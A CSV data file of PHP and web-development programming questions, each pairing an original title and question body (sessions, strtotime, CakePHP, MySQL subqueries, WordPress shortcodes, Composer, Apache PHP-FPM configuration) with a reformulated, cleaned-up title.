originalTitle,body,reformulatedTitle
PHP Sessions Hijacking and it's methods," I was trying to build my own secure PHP Sessions Class, when i was actually wondering what's stopping someone from emulating the session?IE, why wouldn't a code on test.php Not be able to work on index.php where I understand that the way about this is to secure the session by generating a secure ID by locking it to the IP Address and User Agent, but how exactly does that work?Meaning if i were able to guess the session ID would i be able to set the $_SESSION['logged_in'] = true and emulate the login? Should i then change the SESSION variable to check for login to a more secure one?Sorry for my questions and hope i make some sense... <code>  $_SESSION['logged_in'] = true; if($_SESSION['logged_in'] == True){ echo 'logged in';}",PHP Sessions Hijacking and its methods
Result nothing with boolean type in some strtotime function in PHP," I have the variable $EDate, I used strtotime function with this variable with different values and the result was as following: Can anybody explain this and how to avoid the boolean result? <code>  $EDate = 10-21-2013; echo ""strtotime($EDate)""; the result = nothing and the type is boolean$EDate = 09-02-2013; echo ""strtotime($EDate)""; the result = 1360386000 and the type is integer$EDate = 09-30-2013; echo ""strtotime($EDate)""; the result = nothing and the type is boolean$EDate = 09-30-2013; echo ""strtotime($EDate)""; the result = nothing and the type is boolean$EDate = 07-02-2014; echo ""strtotime($EDate)""; the result = 1391749200 and the type is integer$EDate = 10-12-2014; echo ""strtotime($EDate)""; the result = 1418187600 and the type is integer","PHP: strtotime returns ""nothing"" of type ""boolean"""
PHP file_exsits with accent returns false," I have two folders, Folder and Folder. The second one could not be catch by PHP.Here is my test: How to fix it? <code>  <?php $dir = 'D:\wamp\www\test\data\Folder'; var_dump(file_exists($dir)); // true $dir = 'D:\wamp\www\test\data\Folder'; var_dump(file_exists($dir)); // false?>",PHP file_exists with accent returns false
CakePHP table is missing even when it exist," i tried googling and searched for an answer here too,The ProblemCakePHP can't find a table even when it exist.What I tried:Clearing the cache folderVerifying the name of the table & the connection string.Adding useTable = ""urls""The code The error:Missing Database TableError: Table urls for model Url was not found in datasource default.Perhaps someone knows the answer to this? <code>  class Url extends AppModel { public function add_url($the_url,$the_content,$title) { $this->create(); $this->set('url', $the_url ); $this->set('content', $the_content ); $this->set('title', $title ); $this->save(); }} ",CakePHP table is missing even when it exists
"How to get 2 columns from one table and 2 rows as columns from other table in one row, in MySQL? Subquery? (no idea how to describe it shorter)"," I know this is quite complicated, but I sincerely hope someone will check this out.I made short version (to better understand the problem) and full version (with original SQL)Short version: How can I make MySQL query to get rows like that: 2 columns from A and 2 rows from B as columns, only with keys 1 and 2, no empty resultsSubquery?Full version:I tried to get from Prestashop db in one row:product idean13 codeupc codefeature with id 24feature with id 25It's easy to get id_product, ean13 and upc, as it's one row in ps_product table. To get features I used subqueries (JOIN didn't work out). So, I selected id_product, ean13, upc, (subquery1) as code1, (subquery2) as code2.Then I needed to throw out empty rows. But couldn't just put code1 or code2 in WHERE. To make it work I had to put everything in subquery.This code WORKS, but it is terribly ugly and I bet this should be done differently. How can I make it BETTER? <code>  [TABLE A] [TABLE B]|1|a|b| |1|x|2|c|d| |1|y|3| | | |2|z|5| | | |2|v |4|w 1|a|b|x|y2|c|d|z|v SELECT * FROM( SELECT p.id_product as idp, p.ean13 as ean13, p.upc as upc, ( SELECT fvl.value FROM `ps_feature_product` fp LEFT JOIN `ps_feature_value_lang` fvl ON (fp.id_feature_value = fvl.id_feature_value) WHERE fp.id_feature = 24 AND fp.id_product = idp ) AS code1, ( SELECT fvl.value FROM `ps_feature_product` fp LEFT JOIN `ps_feature_value_lang` fvl ON (fp.id_feature_value = fvl.id_feature_value) WHERE fp.id_feature = 25 AND fp.id_product = idp ) AS code2, m.name FROM `ps_product` p LEFT JOIN `ps_manufacturer` m ON (p.id_manufacturer = m.id_manufacturer)) mainqWHERE ean13 != '' OR upc != '' OR code1 IS NOT NULL OR code2 IS NOT NULL","How to get 2 columns from one table and 2 rows as columns from other table in one row, in MySQL?"
Wordpress Can you call a plugin from a page," There's a plugin for the Contact us form.To activate the form, all you have to do is to place [CONTACT-US-FORM] in the page...My page is calling a page template.Is it possible to add the [CONTACT-US-FORM] shortcode in the PHP template?I tried it and it did not work.The WordPress page worked, but not the method I want. PHP Contact Us template I want to try something like this, but it did not work. <code>  [CONTACT-US-FORM] <?php/*Template Name: [contact us]*/get_header(); ?>[CONTACT-US-FORM]<?php get_footer(); ?>",How can I call a WordPress shortcode within a template?
Wordpress How To Call Shortcode Within a template," There's a plugin for the Contact us form.To activate the form, all you have to do is to place [CONTACT-US-FORM] in the page...My page is calling a page template.Is it possible to add the [CONTACT-US-FORM] shortcode in the PHP template?I tried it and it did not work.The WordPress page worked, but not the method I want. PHP Contact Us template I want to try something like this, but it did not work. <code>  [CONTACT-US-FORM] <?php/*Template Name: [contact us]*/get_header(); ?>[CONTACT-US-FORM]<?php get_footer(); ?>",How can I call a WordPress shortcode within a template?
How can I call a Wordpress shortcode within a template?," There's a plugin for the Contact us form.To activate the form, all you have to do is to place [CONTACT-US-FORM] in the page...My page is calling a page template.Is it possible to add the [CONTACT-US-FORM] shortcode in the PHP template?I tried it and it did not work.The WordPress page worked, but not the method I want. PHP Contact Us template I want to try something like this, but it did not work. <code>  [CONTACT-US-FORM] <?php/*Template Name: [contact us]*/get_header(); ?>[CONTACT-US-FORM]<?php get_footer(); ?>",How can I call a WordPress shortcode within a template?
Composer install error - requires ext_curl when it's actualy enabled," I'm trying to install Facebook PHP SDK with Composer. This is what I get Problem is, I have curl extension enabled (uncommented in php.ini). When I run phpinfo(), it says it's enabled.Only clue I have is that when I run $ php -m, 'curl' line is missing but I don't know what to do about it.I have wamp 2.4 on Win8 and I'm running composer in cmd.exe. <code>  $ composer installLoading composer repositories with package informationInstalling dependencies (including require-dev)Your requirements could not be resolved to an installable set of packages. Problem 1 - Installation request for facebook/php-sdk dev-master -> satisfiable by facebook/php-sdk[dev-master]. - facebook/php-sdk dev-master requires ext-curl * -> the requested PHP extension curl is missing from your system.",Composer install error - requires ext_curl when it's actually enabled
Apache 2.4.6 -> client denied by server configuration (PHP FPM), Today I was updated Ubuntu server 13.04 (Raring Ringtail) 13.10 (Saucy Salamander).And my Apache 2 installation is broken.Here my configuration:File error.log File default.conf File mods-enabled/fastcgi.conf When I trying to load the file via the browser I got: What should I to fix it? <code>  [Fri Oct 18 10:48:07.237170 2013] [:notice] [pid 8292:tid 139804677900160] FastCGI: process manager initialized (pid 8292)[Fri Oct 18 10:48:07.241185 2013] [mpm_event:notice] [pid 8289:tid 139804677900160] AH00489: Apache/2.4.6 (Ubuntu) mod_fastcgi/mod_fastcgi-SNAP-0910052141 configured -- resuming normal operations[Fri Oct 18 10:48:07.241652 2013] [core:notice] [pid 8289:tid 139804677900160] AH00094: Command line: '/usr/sbin/apache2'[Fri Oct 18 10:48:28.313923 2013] [authz_core:error] [pid 8294:tid 139804573181696] [client 81.219.59.75:3536] AH01630: client denied by server configuration: /usr/lib/cgi-bin/php5-fcgi #EU<VirtualHost *:80> #ServerName DocumentRoot /var/www/dev_stable DirectoryIndex index.php index.html index.htm <Directory /var/www/dev_stable> Options Indexes FollowSymLinks MultiViews AllowOverride all Require all granted </Directory></VirtualHost> #<IfModule mod_fastcgi.c># AddHandler fastcgi-script .fcgi# FastCgiWrapper /usr/lib/apache2/suexec# FastCgiIpcDir /var/lib/apache2/fastcgi#</IfModule><IfModule mod_fastcgi.c> AddHandler php5-fcgi .php Action php5-fcgi /php5-fcgi Alias /php5-fcgi /usr/lib/cgi-bin/php5-fcgi FastCgiExternalServer /usr/lib/cgi-bin/php5-fcgi -socket /var/run/php5-fpm.sock -pass-header Authorization</Ifmodule> site_name/TEST/ForbiddenYou don't have permission to access /php5-fcgi/TEST/index.php on this server.,Apache 2.4.6 on Ubuntu Server: Client denied by server configuration (PHP FPM) [While loading PHP file]
(Ubuntu Server )Apache 2.4.6 -> client denied by server configuration (PHP FPM) [While load php file], Today I was updated Ubuntu server 13.04 (Raring Ringtail) 13.10 (Saucy Salamander).And my Apache 2 installation is broken.Here my configuration:File error.log File default.conf File mods-enabled/fastcgi.conf When I trying to load the file via the browser I got: What should I to fix it? <code>  [Fri Oct 18 10:48:07.237170 2013] [:notice] [pid 8292:tid 139804677900160] FastCGI: process manager initialized (pid 8292)[Fri Oct 18 10:48:07.241185 2013] [mpm_event:notice] [pid 8289:tid 139804677900160] AH00489: Apache/2.4.6 (Ubuntu) mod_fastcgi/mod_fastcgi-SNAP-0910052141 configured -- resuming normal operations[Fri Oct 18 10:48:07.241652 2013] [core:notice] [pid 8289:tid 139804677900160] AH00094: Command line: '/usr/sbin/apache2'[Fri Oct 18 10:48:28.313923 2013] [authz_core:error] [pid 8294:tid 139804573181696] [client 81.219.59.75:3536] AH01630: client denied by server configuration: /usr/lib/cgi-bin/php5-fcgi #EU<VirtualHost *:80> #ServerName DocumentRoot /var/www/dev_stable DirectoryIndex index.php index.html index.htm <Directory /var/www/dev_stable> Options Indexes FollowSymLinks MultiViews AllowOverride all Require all granted </Directory></VirtualHost> #<IfModule mod_fastcgi.c># AddHandler fastcgi-script .fcgi# FastCgiWrapper /usr/lib/apache2/suexec# FastCgiIpcDir /var/lib/apache2/fastcgi#</IfModule><IfModule mod_fastcgi.c> AddHandler php5-fcgi .php Action php5-fcgi /php5-fcgi Alias /php5-fcgi /usr/lib/cgi-bin/php5-fcgi FastCgiExternalServer /usr/lib/cgi-bin/php5-fcgi -socket /var/run/php5-fpm.sock -pass-header Authorization</Ifmodule> site_name/TEST/ForbiddenYou don't have permission to access /php5-fcgi/TEST/index.php on this server.,Apache 2.4.6 on Ubuntu Server: Client denied by server configuration (PHP FPM) [While loading PHP file]
